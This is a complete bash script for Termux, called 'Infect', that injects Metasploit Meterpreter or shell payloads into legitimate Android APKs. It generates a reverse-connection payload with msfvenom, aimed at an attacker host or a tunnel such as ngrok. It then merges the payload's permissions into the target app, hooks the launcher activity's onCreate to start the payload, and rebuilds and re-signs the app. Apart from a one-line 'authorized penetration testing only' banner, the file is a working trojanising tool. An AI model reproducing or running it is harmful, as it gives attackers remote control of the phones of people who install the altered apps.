#!/data/data/com.termux/files/usr/bin/bash

# Tool name : Infect
# Author    : Alienkrishn [Anon4You]
# Copyright : © Alienkrishn
# GitHub    : https://github.com/Anon4You/Infect.git


RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'
BOLD='\033[1m'
UNDERLINE='\033[4m'

show_banner() {
    clear
    echo -e "${MAGENTA}"
    echo "⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣶⣿⣿⣿⣷⣶⣶⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀"
    echo "⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀"
    echo "⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀"
    echo "⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀"
    echo "⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀"
    echo "⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇"
    echo "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"
    echo "⣿⣿⡏⠉⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠉⠉⣿⣿"
    echo "⢻⣿⡇⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⢀⣿⡇"
    echo "⠘⣿⣷⡀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢿⣿⣿⣿⠿⠛⠋⠀⠀⠀⠀⠀⠀⢀⣼⣿⠃"
    echo "⠀⠹⣿⣿⣶⣦⣤⣀⣀⣀⣀⣀⣤⣶⠟⡿⣷⣦⣄⣀⣀⣀⣠⣤⣤⣶⣿⣿⡟⠀"
    echo "⠀⠀⣨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀"
    echo "⠀⢈⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣷⠀⣼⣷⠀⣸⣿⣿⣿⡿⠿⠿⠿⣿⣿⣿⡇⠀"
    echo "⠀⠘⣿⣿⣿⡟⠋⠀⠀⠰⣿⣿⣿⣷⣿⣿⣷⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⠟⠁⠀"
    echo "⠀⠀⠈⠉⠀⠈⠁⠀⠀⠘⣿⣿⢿⣿⣿⢻⣿⡏⣻⣿⣿⠃⠀⠀⠀⠈⠀⠀⠀⠀"
    echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⣿⣿⢸⣿⡇⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀"
    echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⣿⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
    echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⣿⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
    echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⣿⣿⢸⣿⠃⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
    echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡇⣿⣿⢸⣿⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
    echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠇⢿⡿⢸⡿⠀⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
    echo -e "${NC}"
    echo -e "${BOLD}${CYAN}INFECT - APK Payload Injector${NC}"
    echo -e "${BOLD}${YELLOW}Author: Alienkrishn [Anon4You]${NC}"
    echo -e "${BLUE}Android APK backdoor injector with Meterpreter support"
    echo -e "Supports Ngrok, Portmap.io, Playit.gg and other tunnels${NC}"
    echo -e "\n${RED}${UNDERLINE}For authorized penetration testing only${NC}\n"
}
validate_lhost() {
    local lhost=$1
    
    if [[ $lhost =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        return 0
    elif [[ $lhost =~ ^(tcp://)?[a-zA-Z0-9.-]+\.(ngrok|serveo|localtunnel|portmap|playit)\.(io|me|net|gg|cloud)(:[0-9]+)?$ ]]; then
        return 0
    elif [[ $lhost =~ ^(tcp://)?[a-zA-Z0-9-]+\.(playit\.gg|playit\.cloud)(:[0-9]+)?$ ]]; then
        return 0
    elif [[ $lhost =~ ^(tcp://)?[a-zA-Z0-9-]+\.portmap\.io(:[0-9]+)?$ ]]; then
        return 0
    else
        return 1
    fi
}

spinner() {
    local pid=$!
    local delay=0.1
    local spinstr='|/-\'
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

check_dependencies() {
    echo -e "${YELLOW}[*]${NC} ${BOLD}Checking dependencies...${NC}"
    local missing=0
    declare -A tools=(
        ["apktool"]="APK decompilation/rebuilding"
        ["apkeditor"]="Advanced APK manipulation"
        ["apksigner"]="APK signing"
        ["msfvenom"]="Payload generation"
        ["keytool"]="Keystore generation"
        ["jarsigner"]="Alternative signing"
    )
    
    for tool in "${!tools[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            echo -e "  ${RED}✗${NC} $tool (${tools[$tool]})"
            missing=1
        else
            echo -e "  ${GREEN}✓${NC} $tool (${tools[$tool]})"
        fi
    done
    
    if [ "$missing" -eq 1 ]; then
        echo -e "\n${RED}[ERROR]${NC} ${BOLD}One or more dependencies are missing.${NC}"
        exit 1
    fi
    echo -e "${GREEN}[+]${NC} ${BOLD}All dependencies are satisfied.${NC}\n"
}

generate_payload() {
    echo -e "${YELLOW}[*]${NC} ${BOLD}Generating payload...${NC}"
    echo -e "${CYAN}"
    echo -e "Payload Options:"
    echo -e "1) android/meterpreter/reverse_tcp (Default)"
    echo -e "2) android/meterpreter/reverse_http"
    echo -e "3) android/meterpreter/reverse_https"
    echo -e "4) android/shell/reverse_tcp"
    echo -e "${NC}"
    
    read -p "Select payload type [1-4] (Default 1): " payload_choice
    case $payload_choice in
        2) PAYLOAD="android/meterpreter/reverse_http";;
        3) PAYLOAD="android/meterpreter/reverse_https";;
        4) PAYLOAD="android/shell/reverse_tcp";;
        *) PAYLOAD="android/meterpreter/reverse_tcp";;
    esac
    
    (msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -o payload.apk > /dev/null 2>&1) &
    spinner
    
    if [ ! -f "payload.apk" ]; then
        echo -e "\n${RED}[ERROR]${NC} ${BOLD}Failed to generate payload.${NC}"
        exit 1
    fi
}

decompile_apks() {
    echo -e "${YELLOW}[*]${NC} ${BOLD}Decompiling payload APK...${NC}"
    (apkeditor d -i payload.apk -o payload > /dev/null 2>&1) &
    spinner
    
    echo -e "\n${YELLOW}[*]${NC} ${BOLD}Decompiling target APK...${NC}"
    (apkeditor d -i "$TARGET_APK" -o target > /dev/null 2>&1) &
    spinner
    
    if [ ! -d "payload" ] || [ ! -d "target" ]; then
        echo -e "\n${RED}[ERROR]${NC} ${BOLD}Failed to decompile APKs.${NC}"
        exit 1
    fi
}

clean_smali_path() {
    local path=$1
    echo "$path" | sed 's/\/\//\//g'
}

add_permissions() {
    local manifest_file="target/AndroidManifest.xml"
    
    if ! grep -q 'xmlns:android="http://schemas.android.com/apk/res/android"' "$manifest_file"; then
        echo -e "${RED}[ERROR]${NC} Android namespace not found."
        return 1
    fi
    
    local payload_permissions=$(awk '
        /<uses-permission/ {
            line = $0
            while (line !~ /\/>/) {
                getline
                line = line $0
            }
            print line
        }
    ' payload/AndroidManifest.xml | sed 's/^[ \t]*//;s/[ \t]*$//')
    
    local payload_uses_sdk=$(awk '
        /<uses-sdk/ {
            line = $0
            while (line !~ /\/>/) {
                getline
                line = line $0
            }
            print line
        }
    ' payload/AndroidManifest.xml | sed 's/^[ \t]*//;s/[ \t]*$//')
    
    if [ -n "$payload_uses_sdk" ]; then
        payload_uses_sdk=$(echo "$payload_uses_sdk" | tr '\n' ' ' | sed 's/[ \t]*\/>/ \/>/')
    fi
    
    local tmp_file=$(mktemp)
    cp "$manifest_file" "${manifest_file}.bak"
    
    sed '/<uses-sdk/,/\/>/d' "$manifest_file" > "$tmp_file"
    mv "$tmp_file" "$manifest_file"
    
    awk -v perms="$payload_permissions" -v uses_sdk="$payload_uses_sdk" '
        BEGIN { if (perms != "") split(perms, perm_array, "\n") }
        /<application/ {
            if (uses_sdk != "") print uses_sdk
            for (i in perm_array) if (perm_array[i] != "") print perm_array[i]
        }
        { print }
    ' "$manifest_file" > "$tmp_file"
    
    if ! grep -q "<manifest" "$tmp_file" || ! grep -q "</manifest>" "$tmp_file"; then
        cp "$tmp_file" "target/AndroidManifest.xml.invalid"
        exit 1
    fi
    
    if command -v xmllint > /dev/null 2>&1; then
        if ! xmllint --noout "$tmp_file" 2>/dev/null; then
            cp "$tmp_file" "target/AndroidManifest.xml.invalid"
            exit 1
        fi
    fi
    
    mv "$tmp_file" "$manifest_file"
    cp "$manifest_file" "target/AndroidManifest.xml.modified"
}

inject_payload() {
    add_permissions || exit 1
    
    mkdir -p target/smali/classes/com/metasploit/stage
    cp -r payload/smali/classes/com/metasploit/stage/* target/smali/classes/com/metasploit/stage/
    
    LAUNCHER_ACTIVITY=$(grep -A 20 "<activity" target/AndroidManifest.xml | grep -B 20 "android.intent.action.MAIN" | grep -m 1 "android:name" | cut -d '"' -f 2)
    
    if [ -z "$LAUNCHER_ACTIVITY" ]; then
        echo -e "${RED}[ERROR]${NC} Could not find launcher activity."
        exit 1
    fi
    
    SMALI_PATH=$(echo "$LAUNCHER_ACTIVITY" | sed 's/\./\//g')
    SMALI_FILE="target/smali/classes/$(clean_smali_path "$SMALI_PATH").smali"
    
    if [ ! -f "$SMALI_FILE" ]; then
        SMALI_FILE=$(find target/smali/classes -name "$(basename "$SMALI_PATH").smali" | head -1)
        if [ -z "$SMALI_FILE" ]; then
            echo -e "${RED}[ERROR]${NC} Smali file search failed."
            exit 1
        fi
    fi
    
    sed -i "/\.method.*onCreate(Landroid\/os\/Bundle;)V/,/\.end method/ {
        /invoke-super.*onCreate.*/a \
    \ \ \ \ invoke-static \{p0\}, Lcom\/metasploit\/stage\/Payload;->start(Landroid\/content\/Context;)V
    }" "$SMALI_FILE"
}

rebuild_apk() {
    echo -e "${YELLOW}[*]${NC} ${BOLD}Rebuilding target APK...${NC}"
    (apkeditor b -i target -o "$OUTPUT_APK" > /dev/null 2>&1) &
    spinner
    
    if [ ! -f "$OUTPUT_APK" ]; then
        echo -e "\n${RED}[ERROR]${NC} ${BOLD}Failed to rebuild APK.${NC}"
        exit 1
    fi
}

sign_apk() {
    echo -e "${YELLOW}[*]${NC} ${BOLD}Signing APK...${NC}"
    mkdir -p key
    local keystore="$PREFIX/share/infect/key/infect.keystore"
    local alias="infect"
    local password="alienkrishn"
    
    if [ ! -f "$keystore" ]; then
        (keytool -genkey -v -keystore $keystore -alias $alias -keyalg RSA -keysize 2048 -validity 10000 -storepass $password -keypass $password -dname "CN=infect, OU=infect, O=infect, L=Unknown, ST=Unknown, C=IN" > /dev/null 2>&1) &
        spinner
    fi
    
    if command -v apksigner > /dev/null 2>&1; then
        (apksigner sign --ks $keystore --ks-pass pass:$password --ks-key-alias $alias --key-pass pass:$password --out "${OUTPUT_APK%.*}_signed.apk" "$OUTPUT_APK" > /dev/null 2>&1) &
        spinner
    else
        (jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $keystore -storepass $password -keypass $password "$OUTPUT_APK" $alias > /dev/null 2>&1) &
        spinner
        mv "$OUTPUT_APK" "${OUTPUT_APK%.*}_signed.apk"
    fi
}

cleanup() {
    rm -rf payload payload.apk target "$OUTPUT_APK" "${OUTPUT_APK%.*}_signed.apk.idsig" 2>/dev/null
    rm -f target/AndroidManifest.xml.bak target/AndroidManifest.xml.modified target/AndroidManifest.xml.invalid 2>/dev/null
}

main() {
    show_banner
    
    while true; do
        echo -e "${CYAN}Examples of valid LHOST:${NC}"
        echo -e "  - Local IP: 192.168.1.100"
        echo -e "  - Ngrok: 0.tcp.ngrok.io:12345 or tcp://0.tcp.eu.ngrok.io:54321"
        echo -e "  - Portmap: your-subdomain.portmap.io:12345"
        echo -e "  - Playit: your-subdomain.playit.gg:12345\n"
        read -p "Enter LHOST: " LHOST
        
        if validate_lhost "$LHOST"; then
            break
        else
            echo -e "${RED}[!]${NC} Invalid address. Please enter a valid IP or tunnel address"
        fi
    done
    
    while true; do
        read -p "Enter LPORT (e.g., 4444): " LPORT
        if [[ $LPORT =~ ^[0-9]+$ ]] && [ $LPORT -gt 0 ] && [ $LPORT -lt 65536 ]; then
            break
        else
            echo -e "${RED}[!]${NC} Invalid port number."
        fi
    done
    
    while true; do
        read -p "Enter target APK path: " TARGET_APK
        if [ -f "$TARGET_APK" ]; then
            break
        else
            echo -e "${RED}[!]${NC} File not found."
        fi
    done
    
    read -p "Enter output APK name (without extension): " OUTPUT_BASE
    OUTPUT_APK="${OUTPUT_BASE}.apk"
    
    check_dependencies
    generate_payload
    decompile_apks
    inject_payload
    rebuild_apk
    sign_apk
    cleanup
    
    if [ -f "${OUTPUT_APK%.*}_signed.apk" ]; then
        echo -e "\n${GREEN}[+]${NC} ${BOLD}Final output:${NC} ${OUTPUT_APK%.*}_signed.apk"
    else
        echo -e "\n${GREEN}[+]${NC} ${BOLD}Final output:${NC} $OUTPUT_APK"
    fi
}

main
